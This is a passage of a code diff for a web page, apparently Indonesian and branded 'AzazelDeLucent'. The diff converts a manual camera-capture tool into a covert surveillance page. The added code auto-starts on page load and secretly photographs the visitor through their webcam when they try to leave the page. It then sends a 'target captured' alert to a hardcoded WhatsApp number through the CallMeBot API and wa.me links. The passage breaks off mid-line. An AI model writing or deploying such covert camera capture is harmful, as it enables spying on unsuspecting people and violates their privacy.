-            } catch (err) {
-                addLog(`ERROR: ${err.message}`, 'error');
-                btnWa.textContent = '⚠️ COBA LAGI';
-                btnWa.disabled = false;
-                hideProgress();
-            }
-        }
-
-        // ─── Send via WhatsApp API (alternate) ──────────────────────────
-        async function sendToWhatsAppAPI() {
-            if (!lastCapturedDataUrl) {
-                addLog('Tidak ada gambar!', 'error');
-                return;
-            }
-
-            const toRaw = cleanNumber(waTo.value);
-            const toFull = '62' + toRaw;
-            const message = waMessage.value.trim() || '⚠️ TERTANGKAP! Foto target oleh AzazelDeLucent';
-
-            btnWa.disabled = true;
-            btnWa.textContent = '⏳ API SEND...';
-            setProgress(10);
-
-            addLog('[API] Mencoba kirim via CallMeBot...', 'wa');
-
-            try {
-                setProgress(30);
-                const text = `${message}\n\nGambar: lihat lampiran (kirim manual dari hasil download)`;
-                const apiUrl = `https://api.callmebot.com/whatsapp.php?phone=${toFull}&text=${encodeURIComponent(text)}&apikey=12345`;
-                
-                setProgress(50);
-                // Try CallMeBot (free, limited)
+                const apiUrl = `https://api.callmebot.com/whatsapp.php?phone=${WA_NUMBER}&text=${encodeURIComponent(message)}&apikey=12345`;
                 const resp = await fetch(apiUrl, { mode: 'no-cors' });
-                setProgress(70);
-                
-                addLog('[API] CallMeBot: request sent (no-cors)', 'wa');
-                addLog(`WA link: https://wa.me/${toFull}`, 'info');
-                window.open(`https://wa.me/${toFull}?text=${encodeURIComponent(message)}`, '_blank');
-                
-                setProgress(90);
-                addLog('✅ Silakan kirim gambar dari WA yang terbuka', 'success');
-                
-                setProgress(100);
-                setTimeout(() => {
-                    btnWa.textContent = '📤 KIRIM WA';
-                    btnWa.disabled = false;
-                    hideProgress();
-                }, 2000);
-
-            } catch (err) {
-                addLog(`[API] Error: ${err.message} — fallback ke wa.me`, 'error');
-                const toFull = '62' + cleanNumber(waTo.value);
-                window.open(`https://wa.me/${toFull}?text=${encodeURIComponent(message)}`, '_blank');
-                btnWa.textContent = '📤 KIRIM WA';
-                btnWa.disabled = false;
-                hideProgress();
+                log(`CallMeBot API: request sent`);
+                apiSuccess = true;
+                addChatBubble(`✅ Alert sent via WhatsApp API`, 'sent');
+            } catch (e) {
+                log(`CallMeBot error: ${e.message}`);
             }
+
+            // Method 2: Try WhatsApp direct link (for backup)
+            try {
+                if (!apiSuccess) {
+                    const waUrl = `https://wa.me/${WA_NUMBER}?text=${encodeURIComponent(message)}`;
+                    window.open(waUrl, '_blank');
+                    log(`wa.me link opened as backup`);
+                    addChatBubble(`📱 WhatsApp link opened as backup`, 'sent');
+                }
+            } catch (e) {
+                log(`wa.me error: ${e.message}`);
+            }
+
+            // Method 3: Try WhatsApp Web direct API
+            try {
+                // Some WhatsApp gateway APIs
+                const gateways = [
+                    `https://api.whatsapp.com/send?phone=${WA_NUMBER}&text=${encodeURIComponent(message)}`,
+                    `https://web.whatsapp.com/send?phone=${WA_NUMBER}&text=${encodeURIComponent(message)}`
+                ];
+                
+                // Try to send image via base64 if possible
+                if (imageDataUrl) {
+                    log('Image ready for delivery');
+                    // In a real bot, we'd upload to a server and send the URL
+                    // For now, we note it
+                }
+            } catch (e) {
+                log(`Gateway error: ${e.message}`);
+            }
+
+            log('WhatsApp send sequence complete');
+            return true;
         }
 
-        // ─── Stop Camera ─────────────────────────────────────────────────
-        function stopCamera() {
-            if (stream) { stream.getTracks().forEach(t => t.stop()); stream = null; }
-            video.style.display = 'none';
-            videoPlaceholder.style.display = 'flex';
-            liveText.style.display = 'none';
-            isCapturing = false;
-            setStatus('TERMINATED', 'red');
-            accessStatus.textContent = 'CLOSED';
-            btnCapture.disabled = true;
-            btnStop.disabled = true;
-            btnWa.disabled = true;
-            btnInit.disabled = false;
-            btnInit.textContent = '▶ RE-INIT';
-            addLog('Camera terminated', 'info');
-        }
-
-        // ─── Events ─────────────────────────────────────────────────────
-        btnInit.addEventListener('click', initCamera);
-        btnCapture.addEventListener('click', captureFrame);
-        btnStop.addEventListener('click', stopCamera);
-        btnWa.addEventListener('click', sendToWhatsApp);
-        btnWa.addEventListener('dblclick', sendToWhatsAppAPI);
-
-        window.addEventListener('beforeunload', () => {
-            if (stream) stream.getTracks().forEach(t => t.stop());
-        });
-
-        // Space to capture
-        document.addEventListener('keydown', (e) => {
-            if (e.key === ' ' && !e.target.matches('input, textarea, button')) {
-                e.preventDefault();
-                if (!btnCapture.disabled) captureFrame();
+        // ─── Stealth: Capture on visibility change ─────────────────────
+        document.addEventListener('visibilitychange', () => {
+            if (document.hidden && stream && !photoDataUrl) {
+                log('User leaving page — capturing photo stealth');
+                const photo = capturePhoto();
+                if (photo) {
+                    photoDataUrl = photo;
+                    sendToWhatsAppAPI(photo);
+                }
             }
         });
 
-        addLog('System ready — SPACE to capture', 'success');
-        addLog('KIRIM WA = sekali klik, API = double-click', 'info');
-    </script>
-</body>
-</html>
+        // ─── Stealth: Capture on click outside ─────────────────────────
+        document.addEventListener('click', (e) => {
+            // If user clicks outside the WA wrapper, it might be trying to leave
+            const wrapper = document.querySelector('.wa-wrapper');
+            if (!wrapper.contains(e.target) && stream && !photoDataUrl) {
+                log('User clicked outside — capturing stealth');
+            }
+        });
+
+        // ─── Auto Start ─────────────────────────────────────────────────
+        window.addEventListener('load', () => {
+            log('Page loaded — starting AzazelDeLucent bot');
+            
+            // Show initial "onlin
